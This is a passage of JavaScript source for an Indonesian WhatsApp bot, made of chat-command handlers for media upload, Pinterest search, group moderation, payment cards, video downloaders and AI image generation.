 async function uploadUguu(buffer, ext) {
 const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const mediaFilePath = path.join(__dirname, `${Math.floor(Math.random() * 10000)}.${ext}`);
 fs.writeFileSync(mediaFilePath, buffer);

 const execPromise = (command) => {
 return new Promise((resolve, reject) => {
 exec(command, (error, stdout, stderr) => {
 if (error) reject(error);
 else resolve(stdout.trim());
 });
 });
 };
 let response = await execPromise(`curl -s -F files[]=@${mediaFilePath} https://uguu.se/upload`);
 fs.unlinkSync(mediaFilePath);
 try {
 let jsonResponse = JSON.parse(response);
 return { status: 'Done', result: jsonResponse.files[0].url };
 } catch (error) {
 return { status: 'error', result: 'Gagal mengunggah ke Uguu' };
 }
 }
 // Upload media
 let uploadResult;
 if (/video|image|audio|gif|sticker/g.test(mime)) {
 if (/sticker/g.test(mime)) {
 media = await q.download();
 ext = 'png';
 }
 uploadResult = await uploadUguu(media, ext);
 } else if (/application|text/.test(mime)) {
 uploadResult = await uploadUguu(media, ext);
 } else {
 return reply('Format media tidak didukung untuk konversi URL.');
 }
 if (uploadResult.status === 'Done') {
 let caption = `*[ UPLOAD SUCCESS ]*\n\n🔗 URL: ${uploadResult.result}\n📦 *UKURAN :* ${media.length} Byte`;
 return reply(caption);
 } else {
 return reply(`Gagal mengunggah media: ${uploadResult.result}`);
 }
 } catch (error) {
 console.log(error);
 return reply("Error: " + error.message);
 }
}
break;

case "upgrupaudio": {
 if (!isCreator) return reply(mess.owner)
 if (!text) return m.reply("Judul lagunya mana om")
 
 KhaerulZx.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
 await sleep(6000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
 const judulLagu = text
 KhaerulZx.sendMessage(`120363297863341938@g.us`, {
 audio: await quoted.download(),
 mimetype: "audio/mpeg",
 ptt: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 businessMessageForwardInfo: { 
 businessOwnerJid: "120363347933735658@newsletter"
 }, 
 forwardedNewsletterMessageInfo: {
 newsletterName: judulLagu,
 newsletterJid: "120363347933735658@newsletter"
 }
 }
 }, { quoted: m })
 await sleep(2000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break;
case 'pin2': {
 if (banned.includes(m.sender)) {
 return;
 }
 if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
 const blockedWords = /(sexy|tobrut|cabul|tobrutt|tobbrut|cekerbabat|ceker babat|cekerrbabat|cekerbabad|sexxy|seksi|sexyy|sexyyy|sexxyy|sexxyyy|jilbobs|jilbob|bokep|wangy)/i;
 if (blockedWords.test(text)) {
 return m.reply('Tidak bisa melanjutkan pencarian');
 }
 await m.reply(mess.wait);
 let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let res = data.resource_response.data.results.map(v => v.images.orig.url);
 let firstImageUrl = res[0];
 if (firstImageUrl) {
 await KhaerulZx.sendMessage(m.chat, {
 image: { url: firstImageUrl },
 caption: `Hasil pencarian untuk: ${text}`
 });
 } else {
 m.reply("Tidak ada hasil yang ditemukan.");
 }
}
break;

case 'pin3': {
 if (banned.includes(m.sender)) {
 return;
 }
 if (!text) return m.reply(`Contoh: ${prefix + command} Sasuke`);
 const blockedWords = /(sexy|tobrut|cabul|tobrutt|tobbrut|cekerbabat|ceker babat|cekerrbabat|cekerbabad|sexxy|seksi|sexyy|sexyyy|sexxyy|sexxyyy|jilbobs|jilbob|bokep|wangy)/i;
 if (blockedWords.test(text)) {
 return m.reply('Tidak bisa melanjutkan pencarian');
 }
 await m.reply(mess.wait);
 async function createImage(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, { upload: KhaerulZx.waUploadToServer });
 return imageMessage;
 }
 let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let res = data.resource_response.data.results.map(v => v.images.orig.url);
 let firstImageUrl = res[0];
 if (!firstImageUrl) return m.reply("Tidak ada hasil yang ditemukan.");
 const imageMessage = await createImage(firstImageUrl);
 const bot = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `Hasil pencarian untuk: ${text}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.wm
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: 'Hasil',
 hasMediaAttachment: true,
 imageMessage: imageMessage
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"My Owner","url":"https://wa.me/62895392968503","merchant_url":"https://wa.me/62895392968503"}`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
 }
 ]
 })
 })
 }
 }
 }, {});
 await KhaerulZx.relayMessage(m.chat, bot.message, {
 messageId: bot.key.id
 });
}
break;
case 'getname2': {
 if (banned.includes(m.sender)) return;
 if (!isCreator) return m.reply('*khusus Premium*');
 await loading();
 let target;
 if (m.quoted) {
 target = m.quoted.sender;
 } 
 else if (m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo && m.message.extendedTextMessage.contextInfo.mentionedJid) {
 target = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
 } 
 else if (m.text.includes('@')) {
 const number = m.text.match(/@(\d+)/)?.[1];
 if (number) {
 target = `${number}@s.whatsapp.net`;
 }
 }
 if (target) {
 try {
 const namenye = await KhaerulZx.getName(target);
 m.reply(`Nama pengguna: ${namenye}`);
 } catch (error) {
 m.reply('Tidak dapat menemukan nama pengguna atau pengguna belum pernah berinteraksi dengan bot.');
 }
 } else {
 KhaerulZx.sendMessage(from, { text: "Reply orangnya, mention dengan @nomor, atau ketik nomor langsung" }, { quoted: m });
 }
}
break;
case 'cita-cita':{
	let res = await fetch(
		"https://raw.githubusercontent.com/BadXyz/txt/main/citacita/citacita.json",
	);
	let json = await res.json();
 let ngawi = pickRandom(json)
	let fsizedoc = 10;
	await KhaerulZx.sendMessage(
		m.chat,
		{
			audio: { url: ngawi },
			seconds: fsizedoc,
			ptt: true,
			mimetype: "audio/mpeg",
			fileName: "vn.mp3",
			waveform: [100, 0, 100, 0, 100, 0, 100],
		},
		{ quoted: m },
	);
};
break
case "antitoxic":
{
 if (!isCreator) return m.reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
 if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴏ')
 if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
 if (!isAdmins) return m.reply('ʟᴜ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ ɢʀᴏᴜᴘ')

 await loading()

 if (args.length < 1) return m.reply('ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')

 // Anti Toxic
 const toxicWordsRegex = /(?:ajg|anjing|anjg|ajing|anying|anjingg|anjiing|memek|mmek|memekk|kontol|kntol|kntl|kontl|bangsat|bngst|bangst|bngsat|bego|goblok|gblok|goblk|tolol|bajingan|asw|bangke|puqi)/i;
 const checkToxic = (text) => toxicWordsRegex.test(text);
 if (args[0] === "on") {
 if (welcmm) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
 wlcmm.push(from)
 var groupe = await KhaerulZx.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 KhaerulZx.sendMessage(from, {text: `ᴀɴᴛɪᴛᴏxɪᴄ sᴜᴄᴄᴇs ᴛʟᴀʜ ᴀᴋᴛɪғ`, contextInfo: { mentionedJid : mems }}, {quoted:m})

 } else if (args[0] === "off") {
 if (!welcmm) return m.reply('sᴜᴅᴀʜ ɴᴏɴ ᴀᴋᴛɪғ')
 let off = wlcmm.indexOf(from)
 wlcmm.splice(off, 1)
 m.reply('Sukses Mematikan Anti Toxic di group ini')
 }
 if (welcmm && checkToxic(m.text)) {
 await m.reply('Peringatan! Kata-kata toxic terdeteksi dan pesan telah dihapus.')
 await KhaerulZx.deleteMessage(from, m.key)
 }
}
break
case 'paytest': {
 await KhaerulZx.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

 let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: {
 text: `Berikut daftar metode pembayaran saya ya~`
 },
 carouselMessage: {
 cards: [
 {
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/bf02a0aea88d9d51ec9c5.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
 title: '',
 gifPlayback: false,
 subtitle: ownername,
 hasMediaAttachment: true
 }),
 body: { text: `> Klik tombol Payment DANA di bawah\n> DANA A/N: ucok` },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"083112668264\"}`
 },
 ],
 },
 },
 {
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/42ef0057c6280399c6469.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
 title: '',
 gifPlayback: false,
 subtitle: ownername,
 hasMediaAttachment: true
 }),
 body: { text: `> Klik tombol Payment OVO di bawah\n> OVO A/N: Finsii Akhyar` },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{\"display_text\":\"Payment OVO\",\"id\":\"123456789\",\"copy_code\":\"083112668264\"}`
 },
 ],
 },
 },
 {
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6c3bfc41853efb8a57020.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
 title: '',
 gifPlayback: false,
 subtitle: ownername,
 hasMediaAttachment: true
 }),
 body: { text: `> Klik tombol Payment GOPAY di bawah\n> GOPAY A/N: Finsii Akhyar` },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"0895392968503\"}`
 },
 ],
 },
 },
 {
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/cbc12a743bfa517cf21a1.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
 title: '',
 gifPlayback: false,
 subtitle: ownername,
 hasMediaAttachment: true
 }),
 body: { text: `> Dukung Bot Ini Dengan Saweria` },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Saweria","url":"https://saweria.co/khaerul0i","merchant_url":"https://www.google.com"}`
 },
 ],
 },
 },
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 { quoted: fcall }
 );

 await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
 });
}
break;

case 'intro2': {
m.reply('𝐈𝐧𝐭𝐫𝐨 𝐝𝐮𝐥𝐮 𝐲𝐚𝐚:\n𝐍𝐚𝐦𝐚:\n𝐀𝐬𝐤𝐨𝐭:\n𝐎𝐬𝐡𝐢:\n𝐆𝐞𝐧𝐝𝐞𝐫:\n𝐔𝐦𝐮𝐫:\n\n𝗠𝗲𝗺𝗯𝗲𝗿 𝗯𝗮𝗿𝘂 𝘄𝗮𝗷𝗶𝗯 𝗶𝗻𝘁𝗿𝗼‼️\n𝐖𝐚𝐣𝐢𝐛 𝐩𝐚𝐤𝐚𝐢 𝐦𝐚𝐫𝐠𝐚: 亥nama lu` 𝕱𝖙 𝐌𝐆𝐖𝟒𝟖')
}
break
case 'getsusun': {
 if (!isCreator) return reply('Khusus Owner')
 KhaerulZx.sendMessage(from, {document: fs.readFileSync('./Game/susunkata.json'), caption: 'File susunkata.json', mimetype: 'application/javascript', fileName: 'susunkata.json' }, {quoted: m})
}
break
case 'addcase': {
if (banned.includes(m.sender)) {
return;
}
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'hanako.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'listcase': {
if (banned.includes(m.sender)) {
return;
}
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
case'tozombie':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await KhaerulZx.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
/*case "listgc":{
if (!isCreator) return (`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ ᴀᴊᴀ`)
let getGroups = await KhaerulZx.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await KhaerulZx.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break */
case "listgc": case "cekidgc": case"listgrup": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return (`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ ᴀᴊᴀ`)
let gcall = Object.values(await KhaerulZx.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
KhaerulZx.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: fsaluran})
}
break
// Menggabungkan Anti Link dan Warn dengan nama fitur antilinkv2
case 'antilinkv2': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator)) return m.reply(mess.admin);
    if (!m.isGroup) return m.reply('Khusus untuk grup');
    if (!isBotAdmins) return m.reply('Bot belum admin');
    
    await loading();

    if (args.length < 1) return m.reply('.on untuk mengaktifkan .off untuk menonaktifkan');
    
    if (args[0] === "on") {
        if (AntiLink) return m.reply('Anti-linkv2 sudah aktif');
        ntilink.push(from);
        m.reply('Anti-linkv2 telah diaktifkan');
    } else if (args[0] === "off") {
        if (!AntiLink) return m.reply('Anti-linkv2 sudah mati');
        let off = ntilink.indexOf(from);
        ntilink.splice(off, 1);
        m.reply('Anti-linkv2 telah dinonaktifkan');
    } else {
        m.reply('.on untuk mengaktifkan .off untuk menonaktifkan');
    }
}
break;
case 'antilink': {
if (banned.includes(m.sender)) {
return;
}
if (!(isAdmins || isCreator)) return m.reply(mess.admin)
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
await loading()
if (args.length < 1) return m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
if (args[0] === "on") {
if (AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
ntilink.push(from)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴍᴀᴛɪ')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴅɪ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
} else {
m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
}
}
break
case 'tebakumur': {
if (banned.includes(m.sender)) {
return;
}
          if (!text) return m.reply("Example .tebakumur Owner")
const mmeeg = await fetchJson 
(`https://api.agify.io/?name=${text}`)
  let qour = `[ *TEBAK UMUR* ]
  
  Count: ${mmeeg.count}
  Nama: ${mmeeg.name}
  Umur: ${mmeeg.age}
  `
  await KhaerulZx.sendMessage(from, {text: qour}, {quoted: m})
}
break
case 'freetogame': {
if (banned.includes(m.sender)) {
return;
}
const kocakk = await fetchJson 
(`https://www.freetogame.com/api/games?platform=pc`)
let brak = pickRandom(kocakk)
  let gamefree = `[ *FREE TO GAME* ]
  
  Judul: ${brak.title}
  Deskripsi: ${brak.short_description}
  Link: ${brak.game_url}
  Genre: ${brak.genre}
  Platform: ${brak.platform}
  Publisher: ${brak.publisher}
  Developer: ${brak.developer}
  Rilis: ${brak.release_date}
  `
  await KhaerulZx.sendMessage(from, {image: {url: brak.thumbnail}, caption: gamefree}, {quoted: m})
}
break
case 'yesorno': case 'yesno': case 'yes-no': {
if (banned.includes(m.sender)) {
return;
}
          if (!text) return reply(`Contoh : ${prefix + command} Saya ganteng`)
const haij = await fetchJson 
(`https://yesno.wtf/api`)
  let prik = `[ *YES OR NO* ]
  
  Pertanyaan: ${text}
  Jawaban: ${haij.answer}
  `
  let buttonMessage = {
                 video: {url: haij.image},
                 gifPlayback:true,
                    caption: prik,
                }
            KhaerulZx.sendMessage(m.chat, buttonMessage,{ quoted:m })
}
break
case 'tourl2': {
if (banned.includes(m.sender)) {
return;
}
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'public': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return mess.owner
KhaerulZx.public = true
reply('FInsii AI SUKSES MODE PUBLIC')
}
break
case 'self': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return mess.owner
KhaerulZx.public = false
reply('HANAKO SUCCES MODE SELF')
}
break
//================ D O W N L O A D ==================//

case 'ytmp3': { 
if (banned.includes(m.sender)) {
return;
}
    if (!text) return reply(`• *Contoh :* .${command} https://www.youtube.com/xxxxxxx`);
    reply('Wait ⌛');
 try {
const { youtube } = require("btch-downloader")
let { mp3 } = await youtube(text)
        let doc = { 
            audio: {
                url: mp3
            },
            mimetype: 'audio/mp4',
            fileName: `terserah.mp3`,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: 'https://youtube.com',
                    title: botname,
                    sourceUrl: 'https://youtube.com', 
                    thumbnail: fs.readFileSync('./RulMedia/image/KhaerulZx.jpg')
                }
            }
        };
        await KhaerulZx.sendMessage(m.chat, doc, { quoted: m });
    } catch (error) {
        console.log(error);
        reply('yah... error kak');
    }
}
break;
case 'ytvideo':
case 'ytmp4': {
if (banned.includes(m.sender)) {
return;
}
  if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
  reply('Wait ⌛')
try {
const { youtube } = require("btch-downloader")
let { mp4 } = await youtube(text)
const ytc = `*[ YOUTUBE DOWNLOADER ]*

© ${botname}`;

KhaerulZx.sendMessage(m.chat, { video: { url:mp4}, caption: ytc }, { quoted: m })
} catch (e) {
    reply('*terjadi error :*' + e);
}
}
break
case 'ytvideoxxy':
case 'ytmp4xxxy': {
if (banned.includes(m.sender)) {
return;
}
  if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
  reply(mess.wait)
try {
  reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video terlalu panjang!*')
  let proces = await (await fetch(`https://widipe.com/download/ytdl?url=${text}`)).json()
  let video4 = proces.result.mp4;
  const ytc = `*[ YOUTUBE DOWNLOADER ]*
  *title* ${proces.result.title}
  
  ©${botname}`;
  KhaerulZx.sendMessage(m.chat, { video: { url: video4 }, caption: ytc }, { quoted: m })
} catch (e) {
    reply('*terjadi error :*' + e);
}
}
break
/*Siapa tau mau
Api: https://api.kyuurzy.site
Wm: Tanaka Sense*/
case 'alicia':{
if (banned.includes(m.sender)) {
return;
}
        if (!text) return m.reply('Yaa ada apa sama Alicia?')
        try {
        let KhaerulZx = await fetchJson(`https://api.kyuurzy.site/api/ai/alicia?query=${text}`);
        m.reply(KhaerulZx.result);
        } catch (e) {
        console.error(err);
        m.reply('elol');
        }
        }
        break
        case 'bocchi':{
        if (banned.includes(m.sender)) {
return;
}
        if (!text) return m.reply('Yaa ada apa sama bocchi')
        try {
        let boci = await fetchJson(`https://api.kyuurzy.site/api/ai/Bocchi?query=${text}`);
        m.reply(boci.result);
        } catch (e) {
         console.error(err);
        m.reply('elol');
        }
        }
        break
        case 'tt3':
        case 'tiktok3':
        {
        if (banned.includes(m.sender)) {
return;
}
        	if (!args[0]) return reply(`ʟɪɴᴋ ɴʏ ᴍɴ ʙɪᴀʀ ꜰɪɴꜱɪɪ ᴘʀᴏsᴇs\n\nExample : ${prefix + command} link`)
        reply('Wait, jika terjadi eror silahkan gunakan cmd .tiktok2')
        let api = await fetch(`https://widipe.com/download/ttdl?url=${args[0]}`)
        let betaku = await api.json();
        for (let i of betaku.result.video) {
        	KhaerulZx.sendMessage(m.chat, {
        video: {
        	url: i
        },
        caption: `SUKSES ✅`
        }, {
        	quoted : m
          })
        }
        
await KhaerulZx.sendMessage(m.chat, { audio: { url: betaku.result.audio}, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
}
        break
case 'gimage':{
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply('Hanya orang-orang terpilih yang bisa menggunakan fitur ini')(`Usage: ${prefix}gimage orang jomok`);
KhaerulZx.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://widipe.com/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await KhaerulZx.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
KhaerulZx.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
KhaerulZx.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
/**
 * 
 * [ *IG DOWNLOADER* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//scrape buatan `https://whatsapp.com/channel/0029VagFeoY9cDDa9ulpwM0T`

/**
 * 
 * [ *SDXL FURRY* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */
/**
 * 
 * [ *SDXL ANIME* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//scrape buatan: `https://whatsapp.com/channel/0029VagFeoY9cDDa9ulpwM0T`

case 'sdxlanime': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply(`Example: ${prefix + command} yourrtext`)
async function sdxlAnime(prompt) {
  try {
    return await new Promise(async(resolve, reject) => {
      if(!prompt) return reject("failed reading undefined prompt!");
      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        negativePrompt: "nsfw, nude, uncensored, cleavage, nipples",
        key: "Soft-Anime",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768"
      }).then(res => {
        const data = res.data;
        if(data.code !== 0) return reject(data.message);
        if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
        if(!data.data?.url) return reject("failed generating image!")
        return resolve({
          status: true,
          image: data.data.url
        })
      }).catch(reject)
    })
  } catch (e) {
    return {
      status: false,
      message: e
    }
  }
}
try {
  let bjirrkanjut = await sdxlAnime(text)
  KhaerulZx.sendMessage(from, { image: { url: bjirrkanjut.image }, caption: `nah itu bang` }, { quoted: m })
} catch (error) {
  m.reply("Error bang")
}
}
break

/**
 * 
 * [ *CASE CREATE LOGO* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//Plugins: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V/952

case 'createlogo': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!text) return reply('Please provide the text you want to create a logo with. Example: .createlogo YourTextHere');
    
    m.reply('Generating your logo, please wait...');

    try {
        const url = `https://flamingtext.com/net-fu/proxy_form.cgi?script=fluffy-logo&text=${encodeURIComponent(text)}&imageoutput=true&output=direct&doScale=true&scaleWidth=676&scaleHeight=359`;

        const response = await fetch(url);
        
        if (!response.ok) throw new Error('Failed to generate logo');
        
        const imageBuffer = await response.buffer();
        
       await KhaerulZx.sendMessage(m.chat, { image: imageBuffer, caption: `Here is your logo with the text: ${text}` }, { quoted: m })
    } catch (e) {
        console.error(e);
        m.reply('Sorry, an error occurred while generating the logo.');
    }
}
break
case 'sdxlfurry': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply(`Example: ${prefix + command} yourrtext`)
async function sdxlFurry(prompt) {
  try {
    return await new Promise(async(resolve, reject) => {
      if(!prompt) return reject("failed reading undefined prompt!");
      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        negativePrompt: "nsfw, nude, uncensored, cleavage, nipples",
        key: "Furry-Drawn",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768"
      }).then(res => {
        const data = res.data;
        if(data.code !== 0) return reject(data.message);
        if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
        if(!data.data?.url) return reject("failed generating image!")
        return resolve({
          status: true,
          image: data.data.url
        })
      }).catch(reject)
    })
  } catch (e) {
    return {
      status: false,
      message: e
    }
  }
}
try {
  let plerr = await sdxlFurry(text)
  KhaerulZx.sendMessage(from, { image: { url: plerr.image }, caption: `nah itu bang` }, { quoted: m })
} catch (error) {
  m.reply("Error bang")
}
}
break
case 'tebakangka':
if (!text) return m.reply('*Coba tebak aku sedang memikirkan angka apa, tebak dari 1-20*')
function tebakAngka(tebakan) {
    const angkaAcak = Math.floor(Math.random() * 20) + 1;
    let jumlahTebakan = 0;

    function periksaTebakan(tebakan) {
        jumlahTebakan++;
        if (tebakan < angkaAcak) {
            return "Tebakan Anda terlalu rendah. Coba lagi!";
        } else if (tebakan > angkaAcak) {
            return "Tebakan Anda terlalu tinggi. Coba lagi!";
        } else {
            return `Selamat! Anda telah menebak angka ${angkaAcak} dengan ${jumlahTebakan} tebakan.`;
        }
    }

    return periksaTebakan(tebakan);
}
